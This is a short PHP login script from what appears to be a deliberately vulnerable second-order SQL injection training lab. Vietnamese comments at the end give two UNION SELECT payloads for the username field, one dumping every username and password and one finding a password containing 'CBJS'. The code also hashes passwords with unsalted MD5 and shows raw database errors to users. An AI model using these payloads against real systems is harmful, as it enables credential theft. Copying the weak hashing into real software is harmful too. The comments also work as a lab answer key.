<?php
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include("header.php");
        $database = make_connection("advanced_db");

        $sql = "SELECT username FROM users WHERE username=? and password=?";
        $statement = $database->prepare($sql);
        $username = $_POST['username'];
        $password = md5($_POST['password']);
        $statement->bind_param('ss', $username, $password);
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) { 
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: profile.php"));
        } else {
            $message = "Wrong username or password";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }   
}

include("../basic/static/html/second-order.html");
// file này liên quan đến file profile.php
// payload: $username: ' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users -- a  (cái này liệt kê ra tất cả các username và password dể tìm)
//                    ' UNION SELECT password FROM users WHERE password LIKE '%CBJS%' -- a (tìm ra password chứa CBJS)

